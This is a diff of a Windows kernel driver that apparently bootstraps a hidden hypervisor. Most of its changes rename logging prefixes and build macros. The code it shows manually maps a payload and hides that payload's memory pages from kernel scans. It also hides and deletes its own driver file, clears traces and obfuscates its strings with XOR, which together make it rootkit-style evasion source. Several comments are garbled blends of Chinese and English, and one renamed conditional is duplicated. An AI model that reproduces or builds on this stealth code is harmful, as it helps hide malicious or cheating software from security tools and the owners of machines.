+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey payload barrier ready elapsed=%lu pmo_draw=%llu biz=%llu\n"),
                 elapsed,
                 ps.pmo_draw_done_count,
                 ps.business_tick_count);
@@ -6228,7 +6413,7 @@ static bool mapdriver_onekey_wait_payload_barrier(ULONG timeout_ms,
         mapdriver_delay_ms((LONG)step_ms);
     }
 
-    LOG_DEBUG(_XOR_("[mapDriver] onekey payload barrier wait timeout %lu\n"), timeout_ms);
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey payload barrier wait timeout %lu\n"), timeout_ms);
     return false;
 }
 
@@ -6254,12 +6439,12 @@ static bool mapdriver_onekey_wait_pmo_stable(ULONG timeout_ms,
                 ps.pmo_render_d2d_rt &&
                 ps.pmo_render_brush &&
                 ps.pmo_render_textfmt &&
-                ps.pmo_draw_done_count >= MAPDRIVER_AUTO_ONEKEY_MIN_PMO_DRAWS &&
-                ps.business_tick_count >= MAPDRIVER_AUTO_ONEKEY_MIN_BUSINESS_TICKS;
+                ps.pmo_draw_done_count >= VT_BOOT_MIN_PMO_DRAWS &&
+                ps.business_tick_count >= VT_BOOT_MIN_BUSINESS_TICKS;
 
             if (pmo_ready)
             {
-                LOG_DEBUG(_XOR_("[mapDriver] onekey PMO stable elapsed=%lu draw=%llu biz=%llu d2d=0x%llX brush=0x%llX tfmt=0x%llX\n"),
+                LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey PMO stable elapsed=%lu draw=%llu biz=%llu d2d=0x%llX brush=0x%llX tfmt=0x%llX\n"),
                     elapsed,
                     ps.pmo_draw_done_count,
                     ps.business_tick_count,
@@ -6279,7 +6464,7 @@ static bool mapdriver_onekey_wait_pmo_stable(ULONG timeout_ms,
 
     if (last)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] onekey PMO stable wait timeout draw=%llu biz=%llu finish=%llu d2d=0x%llX stage=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey PMO stable wait timeout draw=%llu biz=%llu finish=%llu d2d=0x%llX stage=0x%llX\n"),
             last->pmo_draw_done_count,
             last->business_tick_count,
             last->pmo_last_isfinish,
@@ -6320,7 +6505,7 @@ static bool mapdriver_onekey_wait_pre_switch_ready(ULONG timeout_ms,
     {
         if (mapdriver_onekey_pre_switch_ready(last))
         {
-            LOG_DEBUG(_XOR_("[mapDriver] onekey pre-switch ready elapsed=%lu flags=0x%llX rip=0x%llX rsp=0x%llX vcpu=%llu\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey pre-switch ready elapsed=%lu flags=0x%llX rip=0x%llX rsp=0x%llX vcpu=%llu\n"),
                 elapsed,
                 last ? last->flags : 0,
                 last ? last->diag.vmcs_host_rip : 0,
@@ -6336,7 +6521,7 @@ static bool mapdriver_onekey_wait_pre_switch_ready(ULONG timeout_ms,
             (last->diag.flags & 2ull) != 0 &&
             last->diag.vmcs_host_rip == 0)
         {
-            LOG_DEBUG(_XOR_("[mapDriver] onekey pre-switch blocked backend=AMD-SVM reason=no-host-rip flags=0x%llX result=0x%llX rsp=0x%llX vcpu=%llu\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey pre-switch blocked backend=AMD-SVM reason=no-host-rip flags=0x%llX result=0x%llX rsp=0x%llX vcpu=%llu\n"),
                 last->flags,
                 last->result,
                 last->diag.vmcs_host_rsp,
@@ -6349,7 +6534,7 @@ static bool mapdriver_onekey_wait_pre_switch_ready(ULONG timeout_ms,
 
     if (last)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] onekey pre-switch wait timeout flags=0x%llX result=0x%llX rip=0x%llX rsp=0x%llX vcpu=%llu\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey pre-switch wait timeout flags=0x%llX result=0x%llX rip=0x%llX rsp=0x%llX vcpu=%llu\n"),
             last->flags,
             last->result,
             last->diag.vmcs_host_rip,
@@ -6385,13 +6570,13 @@ static bool mapdriver_configure_resident_modes()
         hook_mode->new_mode == PAYLOAD_HOOK_MODE_OBSERVE &&
         ept_mode->result == PAYLOAD_RESULT_OK &&
         ept_mode->new_mode == PAYLOAD_EPT_MODE_HANDLE_TRAMP;
-    LOG_DEBUG(_XOR_("[mapDriver] stage12 EPT-only modes ok=%d hook=0x%llX/%llu ept=0x%llX/%llu machenike=%d dwm=0\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] stage12 EPT-only modes ok=%d hook=0x%llX/%llu ept=0x%llX/%llu machenike=%d dwm=0\n"),
         (int)ok,
         hook_mode->result,
         hook_mode->new_mode,
         ept_mode->result,
         ept_mode->new_mode,
-        (int)MAPDRIVER_AUTO_LOAD_MACHENIKE_ON_BOOT);
+        (int)VT_BOOT_AUTO_LOAD_MACHENIKE_ON_BOOT);
     return ok;
 }
 
@@ -6434,7 +6619,7 @@ static bool mapdriver_amd_svm_resident_ready(const mapctl_migration_check* last)
     bool const mode_ok = mapdriver_configure_resident_modes();
     bool const ok = payload_ok && diag_ok && config_ok && hv_ok && mode_ok;
 
-    LOG_DEBUG(_XOR_("[mapDriver] onekey AMD resident validation ok=%d payload=%d diag=%d config=%d hv=%d modes=%d vcpu=%llu ghv=0x%llX rsp=0x%llX target=0x%llX bridge=0x%llX\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey AMD resident validation ok=%d payload=%d diag=%d config=%d hv=%d modes=%d vcpu=%llu ghv=0x%llX rsp=0x%llX target=0x%llX bridge=0x%llX\n"),
         (int)ok,
         (int)payload_ok,
         (int)diag_ok,
@@ -6521,17 +6706,17 @@ static bool mapdriver_amd_svm_activate_all(const mapctl_hv_diag& diag)
 
         if (last_ack == diag.vcpu_count)
         {
-            LOG_DEBUG(_XOR_("[mapDriver] AMD resident VMRUN loop active ack=%llu/%llu attempt=%lu trigger_failures=%llu\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] AMD resident VMRUN loop active ack=%llu/%llu attempt=%lu trigger_failures=%llu\n"),
                 last_ack, diag.vcpu_count, attempt, trigger_failures);
             return true;
         }
 
-        LOG_DEBUG(_XOR_("[mapDriver] AMD resident transfer pending ack=%llu/%llu attempt=%lu trigger_failures=%llu\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] AMD resident transfer pending ack=%llu/%llu attempt=%lu trigger_failures=%llu\n"),
             last_ack, diag.vcpu_count, attempt, trigger_failures);
         mapdriver_delay_ms(50);
     }
 
-    LOG_DEBUG(_XOR_("[mapDriver] AMD resident transfer incomplete ack=%llu/%llu; legacy image retained\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] AMD resident transfer incomplete ack=%llu/%llu; legacy image retained\n"),
         last_ack, diag.vcpu_count);
     return false;
 }
@@ -6579,13 +6764,27 @@ static bool mapdriver_run_amd_onekey_load(PDRIVER_OBJECT DriverObject,
     if (cutover != PAYLOAD_RESULT_OK)
         return false;
 
+#if !VT_AMD_RELEASE_LEGACY_IMAGE_AFTER_HANDOFF
+    bool const retained =
+        Utils::imageBase != nullptr &&
+        Utils::imageSize != 0 &&
+        Utils::testDriverUnloaded != FALSE &&
+        Utils::testDriverImageQuarantined != FALSE;
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] AMD legacy image retained after resident handoff base=%p size=0x%X ack=%llu/%llu retained=%d\n"),
+        Utils::imageBase,
+        Utils::imageSize,
+        pre.diag.vcpu_count,
+        pre.diag.vcpu_count,
+        (int)retained);
+    return retained;
+#else
     auto freetest = &g_onekey_freetest;
     RtlZeroMemory(freetest, sizeof(*freetest));
     freetest->magic = MAPCTL_RELEASE_LEGACY_IMAGE_MAGIC;
     freetest->size = sizeof(*freetest);
     freetest->arm = MAPCTL_RELEASE_LEGACY_IMAGE_ARM;
     mapdriver_free_test_image_control(freetest);
-    LOG_DEBUG(_XOR_("[mapDriver] AMD freetest result=0x%llX phase=%llu image=0x%llX/0x%llX -> 0x%llX/0x%llX vcpu=%llu/%llu refs=%llu\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] AMD freetest result=0x%llX phase=%llu image=0x%llX/0x%llX -> 0x%llX/0x%llX vcpu=%llu/%llu refs=%llu\n"),
         freetest->result,
         freetest->free_phase,
         freetest->test_before,
@@ -6596,6 +6795,7 @@ static bool mapdriver_run_amd_onekey_load(PDRIVER_OBJECT DriverObject,
         freetest->vcpu_requested,
         freetest->scan_refs);
     return freetest->result == PAYLOAD_RESULT_OK;
+#endif
 }
 
 static bool mapdriver_onekey_migration_ready(mapctl_migration_check* last)
@@ -6632,7 +6832,7 @@ static bool mapdriver_onekey_wait_migration_ready(const char* phase,
     {
         if (mapdriver_onekey_migration_ready(last))
         {
-            LOG_DEBUG(_XOR_("[mapDriver] onekey %s migration ready elapsed=%lu flags=0x%llX rip=0x%llX rsp=0x%llX\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey %s migration ready elapsed=%lu flags=0x%llX rip=0x%llX rsp=0x%llX\n"),
                 phase,
                 elapsed,
                 last ? last->flags : 0,
@@ -6646,7 +6846,7 @@ static bool mapdriver_onekey_wait_migration_ready(const char* phase,
 
     if (last)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] onekey %s migration wait timeout flags=0x%llX result=0x%llX legacy=%llu/0x%llX rsp=0x%llX rip=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey %s migration wait timeout flags=0x%llX result=0x%llX legacy=%llu/0x%llX rsp=0x%llX rip=0x%llX\n"),
             phase,
             last->flags,
             last->result,
@@ -6660,7 +6860,7 @@ static bool mapdriver_onekey_wait_migration_ready(const char* phase,
 
 static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
 {
-    LOG_DEBUG(_XOR_("[mapDriver] onekey begin %d\n"), 1);
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey begin %d\n"), 1);
 
     if (!mapdriver_configure_resident_modes())
         return false;
@@ -6672,7 +6872,7 @@ static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
     legacy->arm = MAPCTL_LEGACY_DETACH_ARM;
     legacy->mode = PAYLOAD_LEGACY_DETACH_MODE_ARM;
     mapdriver_legacy_detach_control(legacy);
-    LOG_DEBUG(_XOR_("[mapDriver] onekey legacy result=0x%llX stage=%llu flags=0x%llX ghv=0x%llX/0x%llX vt=0x%llX/0x%llX\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey legacy result=0x%llX stage=%llu flags=0x%llX ghv=0x%llX/0x%llX vt=0x%llX/0x%llX\n"),
         legacy->result,
         legacy->stage,
         legacy->new_flags,
@@ -6694,7 +6894,7 @@ static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
         hostmap_ps.magic != PAYLOAD_STATUS_MAGIC ||
         !mapdriver_map_payload_host_resident_ranges(hostmap_ps, "onekey-pre-switch"))
     {
-        LOG_DEBUG(_XOR_("[mapDriver] onekey hostmap pre-switch failed\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey hostmap pre-switch failed\n"));
         return false;
     }
 
@@ -6704,7 +6904,7 @@ static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
     rsp->size = sizeof(*rsp);
     rsp->arm = MAPCTL_HOST_RSP_SWITCH_ARM;
     mapdriver_switch_host_rsp(rsp);
-    LOG_DEBUG(_XOR_("[mapDriver] onekey switchrsp result=0x%llX switched=%llu/%llu failed=%llu new=0x%llX old=0x%llX\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey switchrsp result=0x%llX switched=%llu/%llu failed=%llu new=0x%llX old=0x%llX\n"),
         rsp->result,
         rsp->switched_count,
         rsp->requested_count,
@@ -6720,7 +6920,7 @@ static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
     bridge->size = sizeof(*bridge);
     bridge->arm = MAPCTL_HOST_RIP_SWITCH_ARM;
     mapdriver_switch_host_bridge(bridge);
-    LOG_DEBUG(_XOR_("[mapDriver] onekey switchbridge result=0x%llX switched=%llu/%llu failed=%llu new=0x%llX old=0x%llX\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey switchbridge result=0x%llX switched=%llu/%llu failed=%llu new=0x%llX old=0x%llX\n"),
         bridge->result,
         bridge->switched_count,
         bridge->requested_count,
@@ -6740,7 +6940,7 @@ static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
 
     if (!mapdriver_unload_common(DriverObject, true, false, true))
     {
-        LOG_DEBUG(_XOR_("[mapDriver] onekey handoff failed %d\n"), 0);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey handoff failed %d\n"), 0);
         return false;
     }
 
@@ -6749,13 +6949,13 @@ static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
     cut->magic = MAPCTL_CUTOVER_MAGIC;
     cut->size = sizeof(*cut);
     cut->arm = MAPCTL_CUTOVER_ARM;
-    // CLEAR is only safe when the TestDriver image is about to be released, or
+    // 清除 is only safe when the TestDriver image is about to be released, or
     // when a specific no-fallback bisect is requested.  In the ordinary
     // soft-quarantine build the payload still needs the legacy handler for
     // VM-exit paths that have not been fully ported yet.
     cut->mode = PAYLOAD_CUTOVER_MODE_CLEAR;
     mapdriver_cutover_control(cut);
-    LOG_DEBUG(_XOR_("[mapDriver] onekey cutover mode=%llu result=0x%llX old=0x%llX new=0x%llX\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey cutover mode=%llu result=0x%llX old=0x%llX new=0x%llX\n"),
         cut->mode,
         cut->result,
         cut->old_target,
@@ -6772,7 +6972,7 @@ static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
     freetest->size = sizeof(*freetest);
     freetest->arm = MAPCTL_RELEASE_LEGACY_IMAGE_ARM;
     mapdriver_free_test_image_control(freetest);
-    LOG_DEBUG(_XOR_("[mapDriver] onekey freetest result=0x%llX phase=%llu test=0x%llX/0x%llX -> 0x%llX/0x%llX vcpu=%llu/%llu refs=%llu bridge_tgt=0x%llX\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey freetest result=0x%llX phase=%llu test=0x%llX/0x%llX -> 0x%llX/0x%llX vcpu=%llu/%llu refs=%llu bridge_tgt=0x%llX\n"),
         freetest->result,
         freetest->free_phase,
         freetest->test_before,
@@ -6786,17 +6986,17 @@ static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
     if (freetest->result != PAYLOAD_RESULT_OK)
         return false;
 
-    // Validation now goes through mapDriver ctl, not the resident payload WDM
-    // dispatch.  In the current stability build, keep these ranges visible
+    // Validation now goes through mapDriver ctl, not the 常驻 Payload WDM
+    // 分发.  In the 当前 stability build, keep these ranges visible
     // after handoff; manual hide/memcheck commands can still bisect the PFN
     // hide path without taking the VM down during ordinary load.
-#if MAPDRIVER_AUTO_ONEKEY_HIDE_AFTER_HANDOFF
+#if VT_HIDE_RESIDENT_POOLS_AFTER_HANDOFF
     mapdriver_hide_payload_memory("onekey-payload-image-direct");
     mapdriver_hide_payload_host_stack("onekey-host-stack");
-#if MAPDRIVER_AUTO_ONEKEY_HIDE_RESIDENT_POOLS
+#if VT_HIDE_RESIDENT_POOLS_AFTER_HANDOFF
     mapdriver_hide_payload_resident_pool_blocks("onekey-resident-pools");
 #endif
-#if MAPDRIVER_AUTO_ONEKEY_HIDE_FULL_ARENA
+#if VT_HIDE_FULL_ARENA
     mapdriver_hide_payload_arena_full("onekey-full-arena");
 #else
     mapdriver_hide_payload_arena_used("onekey-data-arena");
@@ -6814,7 +7014,7 @@ static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
         memcheck->unknown_pages == 0 &&
         memcheck->translate_fail == 0 &&
         memcheck->verify_fail == 0;
-    LOG_DEBUG(_XOR_("[mapDriver] resident hide verify ok=%d result=0x%llX done=%llu checked=%llu hidden=%llu visible=%llu unknown=%llu translate_fail=%llu verify_fail=%llu\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] resident hide verify ok=%d result=0x%llX done=%llu checked=%llu hidden=%llu visible=%llu unknown=%llu translate_fail=%llu verify_fail=%llu\n"),
         (int)hide_ok,
         memcheck->result,
         memcheck->done,
@@ -6827,26 +7027,26 @@ static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
     if (!hide_ok)
         return false;
 #else
-    LOG_DEBUG(_XOR_("[mapDriver] onekey auto-hide skipped for stability build\n"));
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey auto-hide skipped for stability build\n"));
 #endif
-#if MAPDRIVER_AUTO_ONEKEY_DROP_MAP_CTL
+#if VT_BOOT_DROP_CONTROL_DEVICE
     mapdriver_delete_control_device();
 #endif
 
-    LOG_DEBUG(_XOR_("[mapDriver] onekey complete %d\n"), 1);
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey complete %d\n"), 1);
     return true;
 }
 
 static bool mapdriver_onekey_execute(PDRIVER_OBJECT DriverObject)
 {
     // Do not use a mandatory blind sleep here.  The real readiness gates are
-    // payload barrier below and the post-switchbridge migration check.  A small
+    // payload barrier below and the post-switchbridge migration 检查校验.  A small
     // fixed delay can still be enabled for stress/debug builds through base.h.
-#if MAPDRIVER_AUTO_ONEKEY_INITIAL_DELAY_MS
-    mapdriver_delay_ms((LONG)MAPDRIVER_AUTO_ONEKEY_INITIAL_DELAY_MS);
+#if VT_BOOT_INITIAL_DELAY_MS
+    mapdriver_delay_ms((LONG)VT_BOOT_INITIAL_DELAY_MS);
 #endif
 
-#if MAPDRIVER_AUTO_ONEKEY_WAIT_PMO_READY
+#if VT_BOOT_WAIT_PMO_READY
     payload_status ps = {};
     bool ok = mapdriver_onekey_wait_payload_barrier(10000, 100, &ps);
     if (ok)
@@ -6859,8 +7059,9 @@ static bool mapdriver_onekey_execute(PDRIVER_OBJECT DriverObject)
         pre.diag.vmcs_host_rip == 0)
     {
         ok = mapdriver_run_amd_onekey_load(DriverObject, pre);
-        LOG_DEBUG(_XOR_("[mapDriver] onekey AMD resident transfer ok=%d retain_test=0 host_rip=0\n"),
-            (int)ok);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey AMD resident transfer ok=%d retain_test=%d host_rip=0\n"),
+            (int)ok,
+            VT_AMD_RELEASE_LEGACY_IMAGE_AFTER_HANDOFF ? 0 : 1);
         return ok;
     }
 #endif
@@ -6894,24 +7095,24 @@ static bool mapdriver_run_onekey_expanded(PDRIVER_OBJECT DriverObject)
     NTSTATUS status = KeExpandKernelStackAndCallout(
         mapdriver_onekey_expanded_callout,
         &ctx,
-        (SIZE_T)MAPDRIVER_AUTO_ONEKEY_EXPAND_STACK_SIZE);
+        (SIZE_T)VT_BOOT_EXPAND_STACK_SIZE);
     if (!NT_SUCCESS(status))
     {
-        LOG_DEBUG(_XOR_("[mapDriver] onekey expand-stack failed 0x%X; running inline fallback\n"), status);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey expand-stack failed 0x%X; running inline fallback\n"), status);
         ctx.ok = mapdriver_onekey_execute(DriverObject);
     }
 
     return ctx.ok;
 }
 
-#if MAPDRIVER_AUTO_ONEKEY_USE_THREAD
+#if VT_BOOT_USE_THREAD
 static VOID mapdriver_onekey_worker(PVOID StartContext)
 {
     UNREFERENCED_PARAMETER(StartContext);
 
     bool ok = mapdriver_onekey_execute(nullptr);
 
-    LOG_DEBUG(_XOR_("[mapDriver] onekey worker leave ok=%d\n"), (int)ok);
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey worker leave ok=%d\n"), (int)ok);
     PsTerminateSystemThread(ok ? STATUS_SUCCESS : STATUS_DEVICE_NOT_READY);
 }
 
@@ -6933,12 +7134,12 @@ static void mapdriver_start_onekey_worker()
     {
         if (thread)
             ZwClose(thread);
-        LOG_DEBUG(_XOR_("[mapDriver] onekey worker queued %d\n"), 1);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey worker queued %d\n"), 1);
     }
     else
     {
         _InterlockedExchange(&g_onekey_worker_started, 0);
-        LOG_DEBUG(_XOR_("[mapDriver] onekey worker create failed 0x%X\n"), status);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey worker create failed 0x%X\n"), status);
     }
 }
 #endif
@@ -6988,7 +7189,7 @@ static NTSTATUS mapdriver_ctl_device_control(PDEVICE_OBJECT DeviceObject, PIRP I
 
     if (code != MAPCTL_IOCTL_STATUS && code != MAPCTL_IOCTL_MIGRATE_CHECK)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] IOCTL enter code=0x%08X in=%lu out=%lu\n"), code, in_len, out_len);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] IOCTL enter code=0x%08X in=%lu out=%lu\n"), code, in_len, out_len);
     }
 
     switch (code)
@@ -6996,12 +7197,21 @@ static NTSTATUS mapdriver_ctl_device_control(PDEVICE_OBJECT DeviceObject, PIRP I
     case MAPCTL_IOCTL_STATUS:
         if (buffer && out_len >= sizeof(payload_u64))
         {
-            mapctl_status st = {};
-            mapdriver_fill_control_status(&st);
-            ULONG copy_len = out_len < sizeof(st) ? out_len : sizeof(st);
-            RtlCopyMemory(buffer, &st, copy_len);
-            information = copy_len;
-            status = STATUS_SUCCESS;
+            auto st = reinterpret_cast<mapctl_status*>(
+                mapdriver_alloc_scratch_buffer(sizeof(mapctl_status)));
+            if (st)
+            {
+                mapdriver_fill_control_status(st);
+                ULONG copy_len = out_len < sizeof(*st) ? out_len : sizeof(*st);
+                RtlCopyMemory(buffer, st, copy_len);
+                information = copy_len;
+                status = STATUS_SUCCESS;
+                mapdriver_free_scratch_buffer(reinterpret_cast<PUCHAR>(st), sizeof(*st));
+            }
+            else
+            {
+                status = STATUS_INSUFFICIENT_RESOURCES;
+            }
         }
         else
         {
@@ -7079,18 +7289,23 @@ static NTSTATUS mapdriver_ctl_device_control(PDEVICE_OBJECT DeviceObject, PIRP I
             : STATUS_DEVICE_NOT_READY;
         if (NT_SUCCESS(status) && mapdriver_hv_ready())
         {
-            // Keep the normal resident IOCTL dispatch path executable/visible,
-            // but hide the large migrated legacy data arena (ghv/vt_hook/etc.)
-            // before deleting mapDriver control.  The VM-exit bridge runs in
-            // root mode and can still use the hidden arena; guest/kernel scans
-            // should see dummy PFNs for those data pages.
-            mapdriver_unhide_payload_memory("handoff-dropctl-before-control-delete");
+            // release_bootstrap 所在页已经在安装 DriverUnload 前按 CPU 显现。
+            // 控制设备删除后不再存在普通 Resident IOCTL 入口，因此禁止在这里
+            // 全量显现 image/arena/pool；仅隐藏 Root-mode 已建立 Host 映射的数据。
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide host-stack enter\n"));
             mapdriver_hide_payload_host_stack("handoff-dropctl-host-stack");
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide host-stack leave\n"));
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide resident-pools enter\n"));
             mapdriver_hide_payload_resident_pool_blocks("handoff-dropctl-resident-pools");
-#if MAPDRIVER_AUTO_ONEKEY_HIDE_FULL_ARENA
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide resident-pools leave\n"));
+#if VT_HIDE_FULL_ARENA
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide full-arena enter\n"));
             mapdriver_hide_payload_arena_full("handoff-dropctl-full-arena");
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide full-arena leave\n"));
 #else
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide data-arena enter\n"));
             mapdriver_hide_payload_arena_used("handoff-dropctl-data-arena");
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide data-arena leave\n"));
 #endif
         }
         delete_control_after_complete = NT_SUCCESS(status);
@@ -7439,7 +7654,8 @@ static NTSTATUS mapdriver_ctl_device_control(PDEVICE_OBJECT DeviceObject, PIRP I
             {
                 BOOLEAN isManualMap = (req->load_mode == MAPCTL_MK_MODE_MANUAL_MAP) ? TRUE : FALSE;
                 PUNICODE_STRING regOrBootCfg = isManualMap ? (PUNICODE_STRING)req->boot_config : nullptr;
-                bool mk_ok = mapdriver_load_machenike(g_host_driver_object, regOrBootCfg, isManualMap);
+                bool mk_ok = Utils::VerifyAllCpusHvReady() &&
+                    mapdriver_load_machenike(g_host_driver_object, regOrBootCfg, isManualMap);
                 req->result = mk_ok ? PAYLOAD_RESULT_OK : PAYLOAD_RESULT_INVALID_CONTEXT;
                 req->load_mode = (payload_u64)Utils::machenikeMode;
                 req->machenike_base = (payload_u64)Utils::machenikeBase;
@@ -7462,7 +7678,7 @@ static NTSTATUS mapdriver_ctl_device_control(PDEVICE_OBJECT DeviceObject, PIRP I
 
     if (code != MAPCTL_IOCTL_STATUS && code != MAPCTL_IOCTL_MIGRATE_CHECK)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] IOCTL leave code=0x%08X status=0x%08X info=0x%llX del_ctl=%d\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] IOCTL leave code=0x%08X status=0x%08X info=0x%llX del_ctl=%d\n"),
             code, status, (ULONGLONG)information, (int)delete_control_after_complete);
     }
 
@@ -7506,7 +7722,7 @@ static void mapdriver_reclaim_orphaned_control_device(PDRIVER_OBJECT CurrentDriv
 
         if (orphanDev && orphanDev->DriverObject != CurrentDriver)
         {
-            LOG_DEBUG(_XOR_("[mapDriver] reclaiming orphaned control device=%p orphanDriver=%p currentDriver=%p\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] reclaiming orphaned control device=%p orphanDriver=%p currentDriver=%p\n"),
                 orphanDev, orphanDev->DriverObject, CurrentDriver);
             if (orphanDev->DriverObject)
                 orphanDev->DriverObject->DriverUnload = nullptr;
@@ -7546,7 +7762,7 @@ static bool mapdriver_create_control_device(PDRIVER_OBJECT DriverObject)
     }
     if (!NT_SUCCESS(status))
     {
-        LOG_DEBUG(_XOR_("[mapDriver] control device create failed 0x%X\n"), status);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] control device create failed 0x%X\n"), status);
         RtlZeroMemory(&g_control_symlink, sizeof(g_control_symlink));
         return false;
     }
@@ -7562,19 +7778,18 @@ static bool mapdriver_create_control_device(PDRIVER_OBJECT DriverObject)
     status = IoCreateSymbolicLink(&g_control_symlink, &dev_name);
     if (!NT_SUCCESS(status))
     {
-        LOG_DEBUG(_XOR_("[mapDriver] control symlink create failed 0x%X\n"), status);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] control symlink create failed 0x%X\n"), status);
         mapdriver_delete_control_device();
         return false;
     }
 
     g_control_device->Flags &= ~DO_DEVICE_INITIALIZING;
-    LOG_DEBUG(_XOR_("[mapDriver] control device ready %ws\n"), g_control_symlink.Buffer);
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] control device ready %ws\n"), g_control_symlink.Buffer);
     return true;
 }
 
-// DriverMain's diagnostic branches contain several large fixed-size locals.
-// Keep the complete implementation on an expanded kernel stack so later
-// cleanup/logging cannot inherit an already exhausted loader stack.
+// DriverMain's diagnostic branches contain several large fixed-大小尺寸 locals.
+// 将完整的实现执行保持在扩展内核栈上，防止后续的清理与日志输出例程继承已耗尽的加载器调用栈。
 struct mapdriver_driver_main_context
 {
     PDRIVER_OBJECT driver_object;
@@ -7592,11 +7807,11 @@ static NTSTATUS mapdriver_driver_main_body(
     PCWSTR driver_name = mapdriver_driver_name(DriverObject);
     mapdriver_cache_trace_driver_name(driver_name);
 
-    LOG_DEBUG(_XOR_("[mapDriver] DriverMain enter DriverObject=%p RegistryPath=%p\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] DriverMain enter DriverObject=%p RegistryPath=%p\n"),
         DriverObject,
         RegistryPath);
     g_yvt.InitNtSymbol();
-    LOG_DEBUG(_XOR_("[mapDriver] ntos symbols base=%p size=0x%X alloc=%p free=%p prot=%p\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] ntos symbols base=%p size=0x%X alloc=%p free=%p prot=%p\n"),
         (PVOID)g_yvt.ntosInfo.imageBase,
         (ULONG)g_yvt.ntosInfo.imageSize,
         MmAllocateIndependentPages,
@@ -7607,10 +7822,10 @@ static NTSTATUS mapdriver_driver_main_body(
     {
         g_host_driver_object = DriverObject;
         DriverObject->DriverUnload = unload_driver;
-#if !MAPDRIVER_AUTO_ONEKEY_LOAD || MAPDRIVER_AUTO_ONEKEY_KEEP_MAP_CTL
+#if !VT_BOOT_AUTO_ONEKEY_LOAD || VT_BOOT_KEEP_CONTROL_DEVICE
         if (!mapdriver_create_control_device(DriverObject))
         {
-            LOG_DEBUG(_XOR_("[mapDriver] control device is not available; refusing pseudo-load\n"));
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] control device is not available; refusing pseudo-load\n"));
             DriverObject->DriverUnload = nullptr;
             g_host_driver_object = nullptr;
             return STATUS_DEVICE_ALREADY_ATTACHED;
@@ -7618,18 +7833,49 @@ static NTSTATUS mapdriver_driver_main_body(
 #endif
     }
 
-#if MAPDRIVER_DRIVER_FILE_HIDE_ENABLED
+#if VT_DRIVER_FILE_HIDE_ENABLED
     mapdriver_hide_driver_file(DriverObject);
 #endif
-#if MAPDRIVER_DRIVER_FILE_DELETE_ENABLED
+#if VT_DRIVER_FILE_DELETE_ENABLED
     DeleteDriverFile(DriverObject);
 #endif
     mapdriver_clear_traces(driver_name, false);
     bool const pre_load_hv_ready = mapdriver_hv_ready();
-    LOG_DEBUG(_XOR_("[mapDriver] pre-load cleanup done hv_ready=%d\n"), (int)pre_load_hv_ready);
